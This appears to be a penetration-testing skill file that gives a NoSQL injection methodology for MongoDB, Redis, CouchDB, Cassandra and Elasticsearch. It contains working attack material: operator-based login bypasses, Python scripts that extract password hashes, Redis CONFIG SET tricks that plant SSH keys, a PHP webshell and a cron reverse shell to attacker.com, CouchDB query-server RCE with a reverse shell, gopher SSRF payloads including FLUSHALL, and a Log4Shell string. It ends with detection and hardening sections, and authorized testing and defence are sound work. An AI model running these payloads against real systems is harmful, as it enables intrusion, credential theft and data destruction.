# NoSQL Injection — All Techniques

Comprehensive NoSQL injection methodology for authorized penetration tests and bug bounty. Covers MongoDB, Redis, CouchDB, Cassandra, Elasticsearch, and related data stores. Complements the `sqli-specialist` skill for SQL databases.

**Scope:** Authorized engagements only. Confirm written scope before testing any production system.

---

## 1. NoSQL Injection Fundamentals

Unlike SQL injection, NoSQL injection exploits the **query structure of document/key-value stores**. The attack surface differs by database type:

- **MongoDB:** JSON-based operators injected via HTTP parameters or JSON bodies
- **Redis:** Command injection via exposed interfaces or SSRF
- **CouchDB:** HTTP API misconfigurations and JS map/reduce injection
- **Cassandra:** CQL injection (structurally similar to SQL)
- **Elasticsearch:** DSL query injection

### 1.1 Entry Points

```
HTTP GET parameters:    ?username[$ne]=x
HTTP POST (form):       username[$ne]=x&password[$ne]=x
HTTP POST (JSON body):  {"username": {"$ne": ""}, "password": {"$ne": ""}}
HTTP headers:           X-Custom-Filter: {"$gt": ""}
Path parameters:        /api/users/{"$gt":""}
GraphQL variables:      {"filter": {"id": {"$ne": null}}}
```

---

## 2. MongoDB Operator Injection

MongoDB operators begin with `$` — these are the primary injection vectors.

### 2.1 Authentication Bypass

Classic bypass when the app queries `users.findOne({username: req.body.username, password: req.body.password})`:

**JSON body injection:**
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": "admin", "password": {"$ne": "wrong"}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
```

**URL parameter injection (qs library bracket notation):**
```
POST /login
username[$ne]=x&password[$ne]=x
username[$gt]=&password[$gt]=
username[$regex]=.*&password[$regex]=.*
username=admin&password[$ne]=wrong
```

**Why qs matters:** Node.js `qs` library converts `username[$ne]=x` into `{username: {$ne: "x"}}` before it reaches MongoDB. This is the most common entry point.

### 2.2 Full Operator Reference

| Operator | Effect | Injection Use |
|---|---|---|
| `$ne` | Not equal | Bypass equality checks |
| `$gt` | Greater than | Bypass equality, enumerate |
| `$lt` | Less than | Binary search on values |
| `$gte` / `$lte` | ≥ / ≤ | Range-based enumeration |
| `$in` | In array | Test multiple values at once |
| `$nin` | Not in array | Exclusion bypass |
| `$regex` | Regex match | Blind data extraction |
| `$exists` | Field exists | Schema enumeration |
| `$where` | JS expression | RCE / blind extraction |
| `$expr` | Aggregation expr | Complex bypass |

### 2.3 Blind Data Extraction via $regex

When you have boolean feedback (login success/fail, different response lengths):

```json
// Test if username starts with 'a'
{"username": {"$regex": "^a"}, "password": {"$ne": ""}}

// Binary-search full username character by character
{"username": {"$regex": "^ad"}, "password": {"$ne": ""}}
{"username": {"$regex": "^adm"}, "password": {"$ne": ""}}
{"username": {"$regex": "^admi"}, "password": {"$ne": ""}}
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}

// Extract password hash (known username)
{"username": "admin", "password": {"$regex": "^5f4d"}}
{"username": "admin", "password": {"$regex": "^5f4dcc"}}
// Continue until full hash recovered

// URL-parameter form
username=admin&password[$regex]=^5f4dcc
username=admin&password[$regex]=^5f4dcc3b
```

**Automation script (Python):**
```python
import requests, string

def extract_field(url, field, known_prefix=""):
    charset = string.ascii_lowercase + string.digits + string.ascii_uppercase + "@._-"
    result = known_prefix
    while True:
        found = False
        for c in charset:
            payload = {"username": "admin", "password": {"$regex": f"^{result}{c}"}}
            r = requests.post(url, json=payload)
            if "Welcome" in r.text or r.status_code == 200:
                result += c
                found = True
                print(f"[+] Found so far: {result}")
                break
        if not found:
            print(f"[*] Complete: {result}")
            break
    return result

extract_field("http://target.com/api/login", "password")
```

### 2.4 $where — JavaScript Injection

`$where` evaluates a JavaScript expression in MongoDB. **Requires MongoDB < 4.4** (deprecated) or explicitly enabled.

```json
// Authentication bypass
{"$where": "1==1"}
{"$where": "this.username == 'admin'"}
{"$where": "function() { return true; }"}

// Blind boolean extraction (sleep-based for time blind)
{"$where": "function() { if(this.password.match(/^5f/)) { sleep(3000); return true; } return false; }"}

// Data exfiltration via error (if errors are reflected)
{"$where": "function() { throw Error(this.password); }"}
{"$where": "this.password.length > 0"}

// URL parameter form
?filter[$where]=1==1
?search[$where]=function(){return true;}
```

**Time-based blind with $where:**
```python
import requests, time

def time_blind_extract(url, prefix):
    for c in "0123456789abcdef":
        payload = {"$where": f"function(){{if(this.password.match(/^{prefix}{c}/)){{sleep(3000);return true;}}return false;}}"}
        start = time.time()
        requests.post(url, json={"filter": payload})
        elapsed = time.time() - start
        if elapsed > 2.5:
            return prefix + c
    return None
```

### 2.5 Schema Enumeration

```json
// Check if a field exists
{"fieldname": {"$exists": true}}

// Enumerate collection fields via $where
{"$where": "function() { return Object.keys(this).indexOf('ssn') >= 0; }"}
{"$where": "function() { return Object.keys(this).join(',').length > 10; }"}

// Get all users matching a regex on any field
{"$or": [{"email": {"$regex": ".*"}}, {"username": {"$regex": ".*"}}]}
```

---

## 3. MongoDB — Aggregation and Advanced Injection

When the app uses `aggregate()` pipeline:

```json
// $lookup abuse (like SQL JOIN) — if pipeline is injectable
{"$lookup": {"from": "admin_users", "localField": "id", "foreignField": "user_id", "as": "admin"}}

// $group for counting (fingerprint data volume)
{"$group": {"_id": null, "count": {"$sum": 1}}}

// $project to select specific fields in response
{"$project": {"password_hash": 1, "email": 1, "_id": 0}}
```

---

## 4. NoSQL via HTTP Headers and Unusual Contexts

Some apps pass headers directly into queries:

```bash
# Custom filter headers
curl -H "X-Filter: {\"\$ne\": null}" https://target.com/api/users

# Authorization token decoded to JSON, passed to DB
# If JWT payload is passed directly: {"userId": {"$ne": null}}

# GraphQL variable injection
POST /graphql
{"query": "query($filter: JSON!) { users(filter: $filter) { id email } }",
 "variables": {"filter": {"email": {"$ne": null}}}}

# Path parameter injection
GET /api/users/%7B%22%24ne%22%3Anull%7D
# URL-decoded: /api/users/{"$ne":null}
```

---

## 5. NoSQLMap — Automated Tool

```bash
# Install
pip install nosqlmap
# or clone
git clone https://github.com/codingo/NoSQLMap && cd NoSQLMap && pip install -r requirements.txt

# Interactive mode
python nosqlmap.py

# Quick MongoDB auth bypass test
python nosqlmap.py --attack 1 --url http://target.com/login --user-field username --pass-field password

# Blind extraction
python nosqlmap.py --attack 2 --url http://target.com/login --user admin

# Key options in interactive menu:
# 1 = Set target host/port
# 2 = Set web app attack options
# 3 = Set MongoDB attack options  
# 4 = Set CouchDB attack options
```

**Manual payload list for Burp Intruder:**
```
[$ne]=x
[$gt]=
[$regex]=.*
[$exists]=true
[$where]=1==1
{"$ne": ""}
{"$gt": ""}
{"$regex": ".*"}
{"$exists": true}
{"$where": "1==1"}
```

---

## 6. Redis Injection

### 6.1 Redis via Direct Access

If Redis is exposed (default port 6379, no auth):

```bash
# Connect
redis-cli -h target.com -p 6379

# Authentication (if required)
redis-cli -h target.com -p 6379 AUTH password

# Enumerate keys
KEYS *
SCAN 0 MATCH * COUNT 1000

# Read session data
GET session:abc123
HGETALL user:1

# Common web app patterns
KEYS "sess:*"      # Express sessions
KEYS "session:*"   # Generic sessions
KEYS "cache:*"     # Cached data
KEYS "user:*"      # User data
```

### 6.2 Redis RCE via CONFIG SET

If you have Redis access with CONFIG permissions:

```bash
# Write SSH public key (if Redis runs as root or user with .ssh)
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
SET ssh_key "ssh-rsa AAAA... attacker@host"
BGSAVE

# Write webshell (if Redis has write access to web root)
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET shell "<?php system($_GET['cmd']); ?>"
BGSAVE
# Access: http://target.com/shell.php?cmd=id

# Write crontab
CONFIG SET dir /var/spool/cron/
CONFIG SET dbfilename root
SET cron "\n\n*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1\n\n"
BGSAVE
```

### 6.3 Redis via SSRF (Gopher Protocol)

When the app has SSRF to internal Redis:

```bash
# Craft Gopher URL for Redis commands
# Each command: *<number of args>\r\n$<len>\r\n<arg>\r\n...
# FLUSHALL command:
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A

# Set a key via SSRF
gopher://127.0.0.1:6379/_%2A3%0D%0A%243%0D%0ASET%0D%0A%244%0D%0Atest%0D%0A%245%0D%0Ahello%0D%0A

# Automate with Gopherus tool
pip install gopherus
python gopherus.py --exploit redis
# Select shell type, enter details, generates gopher URL

# Use in SSRF payload
?url=gopher://127.0.0.1:6379/_%2A...
```

### 6.4 Redis Session Hijacking

```bash
# Read all session keys
redis-cli KEYS "sess:*"

# Read session data
redis-cli GET "sess:abc123"
# Returns JSON: {"user":{"id":1,"role":"admin"},"loggedin":true}

# Modify session to escalate privileges
redis-cli SET "sess:abc123" '{"user":{"id":1,"role":"superadmin"},"loggedin":true}'

# Create a new admin session
redis-cli SET "sess:hijacked99" '{"user":{"id":1,"role":"admin"},"loggedin":true}'
redis-cli EXPIRE "sess:hijacked99" 86400
# Set cookie: session=hijacked99
```

---

## 7. CouchDB Exploitation

### 7.1 CouchDB Default Access

CouchDB exposes an HTTP API, default port 5984:

```bash
# Check version and status
curl http://target.com:5984/

# List all databases (no auth on default install pre-3.x)
curl http://target.com:5984/_all_dbs

# Read documents from a database
curl http://target.com:5984/users/_all_docs?include_docs=true

# Read specific document
curl http://target.com:5984/users/admin

# Admin party (no auth configured — all users are admins)
curl http://target.com:5984/_users/_all_docs?include_docs=true
```

### 7.2 CouchDB Authentication Bypass

```bash
# Pre-1.3: default admin party
curl http://target.com:5984/_config/admins/

# Create admin account in admin party
curl -X PUT http://target.com:5984/_config/admins/attacker -d '"password123"'

# CVE-2017-12636 / CVE-2018-8007: RCE via query server
curl -X PUT http://target.com:5984/_config/query_servers/cmd -d '"bash -i >& /dev/tcp/attacker.com/4444 0>&1"'
curl -X POST http://target.com:5984/test/_temp_view -H 'Content-Type: application/json' -d '{"language": "cmd", "map": "x"}'
```

### 7.3 CouchDB Map/Reduce JS Injection

```bash
# Design document with malicious view
curl -X PUT http://target.com:5984/app/_design/evil \
  -H "Content-Type: application/json" \
  -d '{"views": {"all": {"map": "function(doc) { emit(doc._id, doc.password); }"}}}'

# Query the view (extracts all passwords)
curl http://target.com:5984/app/_design/evil/_view/all
```

---

## 8. Cassandra CQL Injection

Cassandra Query Language is structurally similar to SQL. Injection occurs when CQL queries are built via string concatenation.

```python
# Vulnerable pattern (Python)
query = f"SELECT * FROM users WHERE username = '{user_input}'"
session.execute(query)
```

### 8.1 Cassandra Injection Payloads

```sql
-- Authentication bypass
' OR '1'='1
' OR 1=1--
admin'--

-- UNION is NOT supported in CQL — use separate queries

-- Enumerate keyspaces (databases)
' AND keyspace_name > '' ALLOW FILTERING--

-- Read system tables
SELECT keyspace_name FROM system.schema_keyspaces;
SELECT columnfamily_name FROM system.schema_columnfamilies WHERE keyspace_name='app';
SELECT column_name, type FROM system.schema_columns WHERE columnfamily_name='users';

-- Dump data (once table structure is known)
SELECT username, password FROM app.users;

-- Cassandra allows ALLOW FILTERING for non-indexed fields
SELECT * FROM users WHERE email='x@x.com' ALLOW FILTERING;
```

### 8.2 Cassandra via cqlsh

```bash
# Direct access (no auth)
cqlsh target.com 9042

# With credentials
cqlsh target.com 9042 -u cassandra -p cassandra

# Enumerate
DESCRIBE KEYSPACES;
USE app;
DESCRIBE TABLES;
SELECT * FROM users LIMIT 10;

# Dump to file
COPY users TO '/tmp/users.csv' WITH HEADER = TRUE;
```

---

## 9. Elasticsearch DSL Injection

Elasticsearch uses JSON queries. Injection occurs when user input is embedded in the query DSL.

### 9.1 Basic DSL Injection

```json
// Vulnerable: app builds {"query": {"match": {"username": "<user_input>"}}}
// Inject by closing the match and adding new clauses

// Auth bypass via match_all override
{"query": {"match_all": {}}}

// Dump all documents
{"query": {"match_all": {}}, "size": 10000}

// Extract specific index
GET /users/_search
{"query": {"match_all": {}}, "size": 10000, "_source": ["username","password","email"]}

// List all indices
GET /_cat/indices?v

// Read document by ID
GET /users/_doc/1
```

### 9.2 Elasticsearch Aggregation Injection

```json
// If aggregation query is injectable
{
  "aggs": {
    "all_passwords": {
      "terms": {"field": "password.keyword", "size": 10000}
    }
  }
}
```

### 9.3 CVE-based Elasticsearch Attacks

```bash
# CVE-2014-3120 / CVE-2015-1427: Groovy/MVEL script injection (ES < 1.6)
curl -X POST "http://target.com:9200/_search" -d '{"script_fields": {"test": {"script": "java.lang.Runtime.exec([\"id\"])"}}}'

# CVE-2021-44228 Log4Shell in Elasticsearch (ES 7.x)
# Inject in search query field:
"${jndi:ldap://attacker.com/a}"
```

---

## 10. Detection Signals and Hardening

### 10.1 Detection Indicators

| Indicator | Meaning |
|---|---|
| `$ne`, `$gt`, `$regex`, `$where` in logs | MongoDB operator injection attempt |
| Unusual JSON nesting in POST bodies | NoSQL payload in request body |
| 200 OK on auth endpoints with operator-containing bodies | Successful bypass |
| Redis CONFIG SET commands in logs | Redis RCE attempt |
| CouchDB `_config` or `_design` PUT requests | CouchDB exploitation |
| Elasticsearch `_search` with match_all + size 10000 | Data enumeration |

### 10.2 Hardening Per Database Type

**MongoDB:**
```javascript
// Input validation: reject objects where string is expected
function sanitize(input) {
  if (typeof input !== 'string') throw new Error('Invalid input type');
  return input;
}

// Use mongoose schema validation (type enforcement)
const UserSchema = new mongoose.Schema({
  username: { type: String, required: true },
  password: { type: String, required: true }
});
// Mongoose will reject operator objects for String fields

// Disable $where globally (MongoDB 4.4+)
// mongod.conf:
// security:
//   javascriptEnabled: false
```

**Redis:**
```
# Require authentication
requirepass strongpassword123

# Bind to localhost only
bind 127.0.0.1

# Disable dangerous commands
rename-command CONFIG ""
rename-command FLUSHALL ""
rename-command DEBUG ""
```

**CouchDB:**
```
# Disable admin party (create admin user)
curl -X PUT http://localhost:5984/_config/admins/admin -d '"password"'

# Bind to localhost only in local.ini
[httpd]
bind_address = 127.0.0.1

# Disable query servers
[query_servers]
# (leave empty)
```

**Elasticsearch:**
```yaml
# Require authentication (elasticsearch.yml)
xpack.security.enabled: true

# Network binding
network.host: 127.0.0.1

# Disable dynamic scripting (7.x+, Groovy disabled by default)
script.allowed_types: none
```

---

## 11. Tooling Summary

| Tool | Use | Repository |
|---|---|---|
| NoSQLMap | MongoDB/CouchDB automated injection | https://github.com/codingo/NoSQLMap |
| Gopherus | Gopher URL generator for Redis SSRF | https://github.com/tarunkant/Gopherus |
| redis-cli | Direct Redis interaction | Built into Redis package |
| cqlsh | Direct Cassandra interaction | Built into Cassandra package |
| Burp Suite Intruder | Fuzz NoSQL operator payloads | Commercial / Community |
| sqlmap | Limited NoSQL support via `--no-cast` | https://sqlmap.org |

---

## 12. References

- PayloadsAllTheThings NoSQL Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
- OWASP Testing for NoSQL Injection: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
- MongoDB Operator Injection: https://www.mongodb.com/docs/manual/reference/operator/query/
- Redis Security: https://redis.io/docs/manual/security/
- CouchDB Security: https://docs.couchdb.org/en/stable/intro/security.html
- Elasticsearch Security: https://www.elastic.co/guide/en/elasticsearch/reference/current/secure-cluster.html
- NoSQLMap: https://github.com/codingo/NoSQLMap
